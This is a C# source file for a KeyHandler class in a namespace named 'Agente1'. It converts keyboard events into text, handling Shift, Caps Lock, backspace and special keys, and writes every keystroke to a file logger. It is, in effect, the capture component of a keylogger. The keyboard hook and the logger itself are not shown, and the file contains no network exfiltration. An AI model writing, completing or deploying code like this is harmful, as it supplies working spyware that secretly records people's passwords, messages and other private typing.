using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agente1
{
    public class KeyHandler
    {
        private readonly FileLogger fileLogger;
        private readonly StringBuilder currentLine;
        private bool shiftPressed;
        private bool capsLockOn;

        public KeyHandler(FileLogger fileLogger)
        {
            this.fileLogger = fileLogger;
            currentLine = new StringBuilder();
            shiftPressed = false;
            capsLockOn = Control.IsKeyLocked(Keys.CapsLock);
        }

        public void HandleKeyDown(Keys key)
        {
            if (key == Keys.LShiftKey || key == Keys.RShiftKey)
            {
                shiftPressed = true;
            }
            else if (key == Keys.CapsLock)
            {
                capsLockOn = !capsLockOn;
            }
            else if (key == Keys.Back)
            {
                if (currentLine.Length > 0)
                {
                    currentLine.Remove(currentLine.Length - 1, 1);
                    fileLogger.RemoveLastCharacter();
                }
            }
            else if (key == Keys.Insert)
            {
                HandleKeyPress("<INSERT>");
            }
            else if (key == Keys.Home)
            {
                HandleKeyPress("<HOME>");
            }
            else if (key == Keys.End)
            {
                HandleKeyPress("<END>");
            }
            else if (key == Keys.Delete)
            {
                HandleKeyPress("<DELETE>");
            }
            else if (key == Keys.LControlKey || key == Keys.RControlKey)
            {
                HandleKeyPress(key == Keys.LControlKey ? "<L-CONTROL>" : "<R-CONTROL>");
            }
            else
            {
                string keyString = GetKeyString(key, shiftPressed, capsLockOn);
                HandleKeyPress(keyString);
            }
        }

        public void HandleKeyUp(Keys key)
        {
            if (key == Keys.LShiftKey || key == Keys.RShiftKey)
            {
                shiftPressed = false;
            }
        }

        private string GetKeyString(Keys key, bool shiftPressed, bool capsLockOn)
        {
            bool toUpper = capsLockOn ^ shiftPressed; // XOR operation to determine if the character should be upper case

            switch (key)
            {
                case Keys.D0: return toUpper ? ")" : "0";
                case Keys.D1: return toUpper ? "!" : "1";
                case Keys.D2: return toUpper ? "@" : "2";
                case Keys.D3: return toUpper ? "#" : "3";
                case Keys.D4: return toUpper ? "$" : "4";
                case Keys.D5: return toUpper ? "%" : "5";
                case Keys.D6: return toUpper ? "^" : "6";
                case Keys.D7: return toUpper ? "&" : "7";
                case Keys.D8: return toUpper ? "*" : "8";
                case Keys.D9: return toUpper ? "(" : "9";
                case Keys.OemPeriod: return ".";
                case Keys.Oemcomma: return ",";
                case Keys.OemQuestion: return toUpper ? "?" : "/";
                case Keys.OemSemicolon: return toUpper ? ":" : ";";
                case Keys.OemQuotes: return toUpper ? "\"" : "'";
                case Keys.OemOpenBrackets: return toUpper ? "{" : "[";
                case Keys.OemCloseBrackets: return toUpper ? "}" : "]";
                case Keys.OemPipe: return toUpper ? "|" : "\\";
                case Keys.OemMinus: return toUpper ? "_" : "-";
                case Keys.Oemplus: return toUpper ? "+" : "=";
                case Keys.Oemtilde: return toUpper ? "~" : "`";
                case Keys.Enter: return "\n";
                case Keys.Space: return " ";
                case Keys.A: return toUpper ? "A" : "a";
                case Keys.B: return toUpper ? "B" : "b";
                case Keys.C: return toUpper ? "C" : "c";
                case Keys.D: return toUpper ? "D" : "d";
                case Keys.E: return toUpper ? "E" : "e";
                case Keys.F: return toUpper ? "F" : "f";
                case Keys.G: return toUpper ? "G" : "g";
                case Keys.H: return toUpper ? "H" : "h";
                case Keys.I: return toUpper ? "I" : "i";
                case Keys.J: return toUpper ? "J" : "j";
                case Keys.K: return toUpper ? "K" : "k";
                case Keys.L: return toUpper ? "L" : "l";
                case Keys.M: return toUpper ? "M" : "m";
                case Keys.N: return toUpper ? "N" : "n";
                case Keys.O: return toUpper ? "O" : "o";
                case Keys.P: return toUpper ? "P" : "p";
                case Keys.Q: return toUpper ? "Q" : "q";
                case Keys.R: return toUpper ? "R" : "r";
                case Keys.S: return toUpper ? "S" : "s";
                case Keys.T: return toUpper ? "T" : "t";
                case Keys.U: return toUpper ? "U" : "u";
                case Keys.V: return toUpper ? "V" : "v";
                case Keys.W: return toUpper ? "W" : "w";
                case Keys.X: return toUpper ? "X" : "x";
                case Keys.Y: return toUpper ? "Y" : "y";
                case Keys.Z: return toUpper ? "Z" : "z";
                default: return $"<{key.ToString().ToUpper()}>";
            }
        }

        private void HandleKeyPress(string key)
        {
            if (key == "\n")
            {
                fileLogger.SaveCurrentLine();
                currentLine.Clear();
            }
            else
            {
                currentLine.Append(key);
                fileLogger.SaveKeyPress(key);
            }
        }
    }

}
